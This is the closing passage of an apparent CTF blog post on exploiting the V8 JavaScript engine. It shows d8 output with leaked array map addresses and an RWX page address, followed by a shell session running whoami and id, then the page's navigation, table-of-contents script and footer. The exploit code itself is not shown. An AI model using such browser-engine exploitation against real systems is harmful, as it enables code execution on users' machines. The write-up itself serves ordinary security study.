-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">linuz</span><span class="p">@</span><span class="nd">linz</span><span class="p">:</span><span class="o">~</span><span class="sr">/Desktop/</span><span class="nx">CSI</span><span class="o">/</span><span class="nx">BrowserEXP</span><span class="o">/</span><span class="nx">Modern</span><span class="o">/</span><span class="nx">pwn_modern_typer</span><span class="o">/</span><span class="nx">v8</span><span class="o">/</span><span class="nx">out</span><span class="p">.</span><span class="nx">gn</span><span class="o">/</span><span class="nx">x64</span><span class="p">.</span><span class="nx">release$</span> <span class="p">.</span><span class="o">/</span><span class="nx">d8</span> <span class="nx">test</span><span class="p">.</span><span class="nx">js</span> 
-<span class="nx">Float_arr_map</span><span class="p">:</span> <span class="mh">0x8203ae1</span>
-<span class="nx">Obj_arr_map</span><span class="p">:</span> <span class="mh">0x8203b31</span>
-<span class="nx">Arr2</span><span class="p">:</span> <span class="mh">0x82d8da9</span>
-<span class="nx">ADDRESS</span> <span class="nx">RWX</span><span class="p">:</span> <span class="mh">0x35a8afa8e000</span>
-<span class="nx">$</span> <span class="nx">whoami</span>
-<span class="nx">linuz</span>
-<span class="nx">$</span> <span class="nx">id</span>
-<span class="nx">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="nx">linuz</span><span class="p">)</span> <span class="nx">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="nx">linuz</span><span class="p">)</span> <span class="nx">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="nx">linuz</span><span class="p">),</span><span class="mi">4</span><span class="p">(</span><span class="nx">adm</span><span class="p">),</span><span class="mi">24</span><span class="p">(</span><span class="nx">cdrom</span><span class="p">),</span><span class="mi">27</span><span class="p">(</span><span class="nx">sudo</span><span class="p">),</span><span class="mi">30</span><span class="p">(</span><span class="nx">dip</span><span class="p">),</span><span class="mi">46</span><span class="p">(</span><span class="nx">plugdev</span><span class="p">),</span><span class="mi">120</span><span class="p">(</span><span class="nx">lpadmin</span><span class="p">),</span><span class="mi">131</span><span class="p">(</span><span class="nx">lxd</span><span class="p">),</span><span class="mi">132</span><span class="p">(</span><span class="nx">sambashare</span><span class="p">),</span><span class="mi">998</span><span class="p">(</span><span class="nx">docker</span><span class="p">)</span>
-<span class="nx">$</span> 
-</code></pre></div></div>
-
-
-    </div>
-
-</article>
-<div class="post-nav">
-<a class="previous" href="/ctf/2021/11/07/padnote.html" title="Padnote">Padnote</a><span></span>
-</div>
-<div class="post-related">
-      <div>Related Articles</div>
-      <ul>
-        <li><a class="post-link" href="/ctf/2021/11/07/padnote.html" title="">Padnote</a></li>
-<li><a class="post-link" href="/ctf/2021/11/29/quickmaffs.html" title="">Cyber Jawara Quick Maffs</a></li>
-</ul>
-    </div>
-<div class="post-comments"></div></section>
-</div>
-
-
-  </section>
-  <section class="sidebar" style="margin-left: 15px;">
-    <!-- Get sidebar items --><style type="text/css" media="screen">
-.post-menu ul {
-  list-style: none;
-  padding: 0;
-  margin: 0;
-}
-</style>
-
-<div class="post-menu">
-  <div class="post-menu-title">Contents</div>
-  <div class="post-menu-content"></div>
-</div>
-
-<script>
-  function generateContent() {
-    var menu = document.querySelector(".post-menu");
-    var menuContent =  menu.querySelector(".post-menu-content");
-    var headings = document.querySelector(".post-content").querySelectorAll("h2, h3, h4, h5, h6");
-
-    // Hide menu when no headings
-    if (headings.length === 0) {
-      return menu.style.display = "none";
-    }
-
-    // Generate post menu
-    var menuHTML = '';
-    for (var i = 0; i < headings.length; i++) {
-      var h = headings[i];
-      menuHTML += (
-        '<li class="h-' + h.tagName.toLowerCase() + '">'
-        + '<a href="#h-' + h.getAttribute('id') + '">' + h.textContent + '</a></li>');
-    }
-
-    menuContent.innerHTML = '<ul>' + menuHTML + '</ul>';
-
-    // The header element
-    var header = document.querySelector('header.site-header');
-
-    function doMenuCollapse(index, over_items) {
-      var items = menuContent.firstChild.children;
-
-      if (over_items == undefined) {
-        over_items = 20;
-      }
-
-      if (items.length < over_items) {
-        return;
-      }
-
-      var activeItem = items[index];
-      var beginItem = activeItem
-      var endItem = activeItem
-      var beginIndex = index;
-      var endIndex = index + 1;
-      while (beginIndex >= 0
-        && !items[beginIndex].classList.contains('h-h2')) {
-        beginIndex -= 1;
-      }
-      while (endIndex < items.length
-        && !items[endIndex].classList.contains('h-h2')) {
-        endIndex += 1;
-      }
-      for (var i = 0; i < beginIndex; i++) {
-        item = items[i]
-        if (!item.classList.contains('h-h2')) {
-          item.style.display = 'none';
-        }
-      }
-      for (var i = beginIndex + 1; i < endIndex; i++) {
-        item = items[i]
-        // if (!item.classList.contains('h-h2')) {
-          item.style.display = '';
-        // }
-      }
-      for (var i = endIndex; i < items.length; i++) {
-        item = items[i]
-        if (!item.classList.contains('h-h2')) {
-          item.style.display = 'none';
-        }
-      }
-    }
-
-    // Init menu collapsed
-    doMenuCollapse(-1);
-
-    // Active the menu item
-    window.addEventListener('scroll', function (event) {
-      var lastActive = menuContent.querySelector('.active');
-      var changed = true;
-      var activeIndex = -1;
-      for (var i = headings.length - 1; i >= 0; i--) {
-        var h = headings[i];
-        var headingRect = h.getBoundingClientRect();
-        var headerRect = header.getBoundingClientRect();
-        var headerTop = Math.floor(headerRect.top);
-        var headerHeight = Math.floor(headerRect.height);
-        var headerHeight = headerTop + headerHeight + 20;
-        if (headingRect.top <= headerHeight) {
-          var id = 'h-' + h.getAttribute('id');
-          var a = menuContent.querySelector('a[href="#' + id  + '"]');
-          var curActive = a.parentNode;
-          if (curActive) {
-            curActive.classList.add('active');
-            activeIndex = i;
-          }
-          if (lastActive == curActive) {
-            changed = false;
-          }
-          break;
-        }
-      }
-      if (changed) {
-        if (lastActive) {
-          lastActive.classList.remove('active');
-        }
-        doMenuCollapse(activeIndex);
-      }
-      event.preventDefault();
-    });
-  }
-  generateContent();
-</script>
-</section>
-</div>
-
-      </div>
-    </main><footer class="site-footer h-card">
-  <data class="u-url" href="/"></data>
-
-  <div class="wrapper">
-    <div class="site-footer-inner">
-<div>Unpublished Work <span class="copyleft">©</span> 2017-2021 linz04</div>
-      <div>Powered by <a title="Jekyll is a simple, blog-aware, static site
-      generator." href="http://jekyllrb.com/">Jekyll</a> &amp; <a title="Yat, yet
-      another theme." href="https://github.com/jeffreytse/jekyll-theme-yat">Yat Theme</a>.</div>
-      <div class="footer-col rss-subscribe">Subscribe <a href="/feed.xml">via RSS</a>
-</div>
-    </div>
-  </div>
-</footer>
-</body>
-</html>
+:ET
